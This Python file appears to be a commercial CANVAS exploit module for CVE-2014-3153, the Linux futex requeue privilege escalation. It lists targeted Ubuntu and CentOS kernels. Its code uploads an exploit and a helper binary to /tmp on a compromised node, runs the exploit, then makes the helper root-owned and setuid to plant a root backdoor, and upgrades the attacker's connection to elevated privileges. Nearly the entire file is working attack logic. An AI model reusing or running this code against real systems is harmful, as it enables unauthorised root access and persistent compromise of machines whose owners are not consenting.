#!/usr/bin/env python

# The information provided below is only available to subscribers of Immunity's Early Updates
# and is subject to the terms of the Immunity CANVAS Software License Agreement located here:
#
# https://www.immunityinc.com/downloads/license.txt
#
# It is the customer's responsibility to maintain the confidentiality of this information, and
# any tools, techniques, or information provided as part of the Immunity's CANVAS Early Update
# Program.

# This information is not for re-release to any third party, including contractors, consultants,
# and temporary workers.

import sys
import re
if '.' not in sys.path:
    sys.path.append('.')

import canvasengine

from exploitutils import *
from canvaserror import *
from libs.canvasos import *

from ExploitTypes.linuxLocalExploit import LinuxLocalExploit
from linuxNode import linuxNode


NAME                           = 'Futex Requeue Privilege Escalation Exploit'
DESCRIPTION                    = 'Elevate MOSDEF Node privileges through CVE-2014-3153'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'Linux'
DOCUMENTATION['Repeatability'] = 'Multiple times'
DOCUMENTATION['CVE Name']      = 'CVE-2014-3153'
DOCUMENTATION['CVE Url']       = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3153'

VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Local'
PROPERTY['ARCH']               = [['Linux', 'x64', 'i386']]

DOCUMENTATION['Notes'] = """
- Supported 64bit kernels:
   3.11.0-[13-22]-generic  -   Ubuntu saucy 13.10
   3.11.0-[13-22]-generic  -   Ubuntu precise 12.04
   3.13.0-[24-27]-generic  -   Ubuntu trusty 14.04
   3.13.0-[24-27]-generic  -   Ubuntu precise 12.04
   3.2.0-[23-63]-generic   -   Ubuntu precise 12.04
   3.5.0-[19-49]-generic   -   Ubuntu precise 12.04
   3.8.0-[19-41]-generic   -   Ubuntu precise 12.04

- Supported 32bit kernels:
   3.11.0-[13-22]-generic  -   Ubuntu saucy 13.10
   3.11.0-[13-22]-generic  -   Ubuntu precise 12.04
   3.13.0-[24-27]-generic  -   Ubuntu trusty 14.04
   3.13.0-[24-27]-generic  -   Ubuntu precise 12.04
   3.2.0-23-generic        -   Ubuntu precose 12.04
   3.2.0-[33-63]-generic   -   Ubuntu precise 12.04
   3.2.0-23-generic-pae    -   Ubuntu precise pae 12.04
   3.2.0-[33-63]-generic-pae - Ubuntu precise pae 12.04
   3.5.0-[19-49]-generic   -   Ubuntu precise 12.04
   3.5.0-[19-49]-generic   -   Ubuntu quantal 12.10
   3.8.0-[19-41]-generic   -   Ubuntu precise 12.04
   3.8.0-[19-41]-generic   -   Ubuntu raring  13.04
   2.6.32-220.*el6.i686    -   Centos/RH6
   2.6.32-279.*el6.i686    -   Centos/RH6
   2.6.32-358.*el6.i686    -   Centos/RH6
   2.6.32-431.*el6.i686    -   Centos/RH6

"""

targets = {
    0: ['Autodetect', [0, 0, 0, 0]]
}

class theexploit(LinuxLocalExploit):
    def __init__(self):
        LinuxLocalExploit.__init__(self)
        self.name           = NAME
        self.node           = None
        self.local_res      = os.path.join(os.path.dirname(__file__), 'Resources')
        self.local_exp      = os.path.join(self.local_res, 'x')
        self.remote_exp     = '/tmp/x'
        self.remote_helper  = '/tmp/h'
        self.tmpfilepath    = '/tmp/.hf'
        self.schedcount     = '200'

        self.use_local_interface = False

    def get_args(self):
        """
        Retrieve and initialize arguments
        """
        self.node           = self.argsDict['passednodes'][0]

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def run(self):
        self.get_args()

        if self.node.shell is None:
            self.log("[EE] Node has no shell server available")
            self.log("[EE] Bailing")
            return 0

        if isinstance(self.node, linuxNode):
            if self.node.proctype not in ['i386', 'x64']:
                self.log('[EE] Node of type (%s) proctype (%s) is not supported' % (self.node.nodetype, self.node.proctype))
                return 0

        master,slave = self.node.shell.findpts()
        self.node.shell.sh_tty_child(master,slave)

        if self.compromised(self.remote_helper, 0):
            self.log('[+] Already compromised')
            self.log('[+] Initing elevated MOSDEF loop')
            self.fork_and_exec(self.remote_helper, wait = 1)

            if self.is_64bit_node():
                self.init_mosdef_upgrade()

            self.cleanup()
            return True

        self.log('[+] Uploading helper and exploit')

        if self.node.proctype == 'i386':
            self.local_exp += "32"
            if self.nodeUpload(self.local_helper_32, self.remote_helper) == False:
                return False
        else:
            self.local_exp += "64"
            if self.nodeUpload(self.local_helper_64, self.remote_helper) == False:
                return False

        if self.nodeUpload(self.local_exp, self.remote_exp) == False:
            return False


        self.node.shell.write(master, '%s %s %s\r\n' % (self.remote_exp,self.tmpfilepath,self.schedcount))
        self.log('[+] Waiting...')
        time.sleep(40)

        output = ""

        self.node.shell.write(master, 'chown root:root %s\r\n' % self.remote_helper)
        self.node.shell.write(master, 'chmod 4755 %s\r\n' % self.remote_helper)
        self.node.shell.write(master, 'exit\r\n')

        if self.compromised(self.remote_helper, 1):
            self.log('[+] Compromised!')
            self.log('[+] Upgrading MOSDEF connection loop')

            self.fork_and_exec(self.remote_helper, wait = 1)
            self.node.shell.close(master)

            if self.is_64bit_node():
                self.init_mosdef_upgrade()

            self.cleanup()
            self.log('[+] Done')
        else:
            output = self.node.shell.readall(master)
            output += self.node.shell.readall(master)
            output += self.node.shell.readall(master)

            err_code = None
            try:
                print output
                err_code = re.findall('ERROR\s+-\s+([^\n]+)', output)[0].strip()
            except IndexError:
                pass

            # GET THE ERROR CODE
            self.log('[EE] Looks like we failed: "%s". You can try again.' % err_code)
            if 'looping' not in output:
                self.log('[EE] We will keep this process running. If you close the node you may crash the system.')
                self.node.shell.close(master)
            self.cleanup()
            return False

        return True


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v%s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
